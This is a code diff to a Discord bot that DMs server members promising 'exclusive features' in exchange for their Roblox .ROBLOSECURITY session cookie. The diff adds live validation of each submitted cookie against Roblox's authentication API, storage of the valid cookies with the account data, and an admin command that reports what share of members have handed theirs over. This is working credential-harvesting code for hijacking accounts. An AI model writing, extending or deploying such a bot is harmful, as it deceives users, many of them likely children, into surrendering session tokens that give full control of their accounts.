@@ -21,8 +21,38 @@ const client = new Client({
 
 // In-memory store for who sent cookies and who was DM'd
 // Replace with DB or persistent storage for production
-const userCookies = new Map(); // userId => cookie string
+const userCookies = new Map(); // userId => { cookie: string, robloxData: object }
 const usersDMd = new Set(); // userIds who got DM'd to request cookie
+
+// Helper function to validate Roblox cookie
+async function validateRobloxCookie(cookie) {
+  try {
+    // Clean the cookie input - remove .ROBLOSECURITY= prefix if present
+    const cleanCookie = cookie.replace(/^\.ROBLOSECURITY=/, '');
+    
+    const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
+      headers: {
+        Cookie: `.ROBLOSECURITY=${cleanCookie}`,
+        'User-Agent': 'Roblox/WinInet',
+      },
+    });
+
+    if (!res.ok) {
+      return { valid: false, error: `HTTP ${res.status}` };
+    }
+
+    const data = await res.json();
+    
+    // Check if the response contains valid user data
+    if (!data.id || !data.name) {
+      return { valid: false, error: 'Invalid cookie - no user data returned' };
+    }
+
+    return { valid: true, data, cleanCookie };
+  } catch (error) {
+    return { valid: false, error: error.message };
+  }
+}
 
 // Register slash commands on startup
 const commands = [
@@ -61,25 +91,16 @@ const rest = new REST({ version: '10' }).setToken(TOKEN);
 
 client.once('ready', async () => {
   console.log(`Logged in as ${client.user.tag}`);
-
-  // Optional: On ready, you could DM all members who haven't submitted a cookie yet
-  // but be careful about rate limits & spam
 });
 
-// Helper to send friend request + DM for cookie request
+// Helper to send DM for cookie request
 async function requestCookieFromUser(user) {
   try {
     if (!user) return;
 
-    // If not friends, send friend request
-    if (!user.friend) {
-      await user.sendFriendRequest?.(); // Note: Discord.js does NOT officially support sending friend requests via bots, so this is a placeholder
-      // Alternatively, just DM directly and say "Please add me as friend to continue" or similar
-    }
-
     // DM user to ask for cookie, only once
     if (!usersDMd.has(user.id)) {
-      await user.send("Hi! Please submit your Roblox `.ROBLOSECURITY` cookie securely with `/submitcookie <cookie>` so you can access exclusive features.");
+      await user.send("Hi! Please submit your Roblox `.ROBLOSECURITY` cookie securely with `/submitcookie <cookie>` so you can access exclusive features.\n\n**Note:** Your cookie will be validated to ensure it's authentic before being stored.");
       usersDMd.add(user.id);
     }
   } catch (error) {
@@ -95,36 +116,38 @@ client.on('interactionCreate', async interaction => {
 
     await interaction.deferReply({ ephemeral: true });
 
-    try {
-      // Roblox API check
-      const res = await fetch('https://users.roblox.com/v1/users/authenticated', {
-        headers: {
-          Cookie: `.ROBLOSECURITY=${cookie}`,
-          'User-Agent': 'Roblox/WinInet',
-        },
-      });
-
-      if (!res.ok) {
-        await interaction.editReply(`❌ Invalid cookie or Roblox API error: HTTP ${res.status}`);
-        return;
-      }
-
-      const data = await res.json();
-      await interaction.editReply(`✅ Valid cookie! API Response:\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\``);
-    } catch (err) {
-      console.error(err);
-      await interaction.editReply(`❌ Error checking cookie: ${err.message}`);
+    const validation = await validateRobloxCookie(cookie);
+    
+    if (!validation.valid) {
+      await interaction.editReply(`❌ Invalid cookie: ${validation.error}`);
+      return;
     }
+
+    await interaction.editReply(`✅ Valid cookie! User authenticated as: **${validation.data.name}** (ID: ${validation.data.id})\n\`\`\`json\n${JSON.stringify(validation.data, null, 2)}\n\`\`\``);
   }
 
   if (interaction.commandName === 'submitcookie') {
     const cookie = interaction.options.getString('cookie');
     const userId = interaction.user.id;
 
-    // Store cookie securely - here just in memory for demo
-    userCookies.set(userId, cookie);
+    await interaction.deferReply({ ephemeral: true });
 
-    await interaction.reply({ content: '✅ Cookie received and stored securely.', ephemeral: true });
+    // Validate cookie before storing
+    const validation = await validateRobloxCookie(cookie);
+    
+    if (!validation.valid) {
+      await interaction.editReply(`❌ Invalid cookie: ${validation.error}\nPlease provide a valid .ROBLOSECURITY cookie from Roblox.`);
+      return;
+    }
+
+    // Store cookie and user data securely
+    userCookies.set(userId, {
+      cookie: validation.cleanCookie,
+      robloxData: validation.data,
+      submittedAt: new Date()
+    });
+
+    await interaction.editReply(`✅ Valid cookie received and stored securely!\nAuthenticated as: **${validation.data.name}** (ID: ${validation.data.id})`);
   }
 });
 
@@ -149,6 +172,14 @@ client.on('messageCreate', async message => {
       }
     }
     message.channel.send(`Requested cookies from ${count} users who have not submitted yet.`);
+  }
+
+  // Admin command to check cookie status
+  if (message.content === '!cookiestatus' && message.member.permissions.has('Administrator')) {
+    const validCookies = userCookies.size;
+    const totalMembers = message.guild.memberCount - message.guild.members.cache.filter(m => m.user.bot).size;
+    
+    message.channel.send(`📊 **Cookie Status:**\n✅ Valid cookies stored: ${validCookies}\n👥 Total members: ${totalMembers}\n📈 Coverage: ${((validCookies / totalMembers) * 100).toFixed(1)}%`);
   }
 });
 
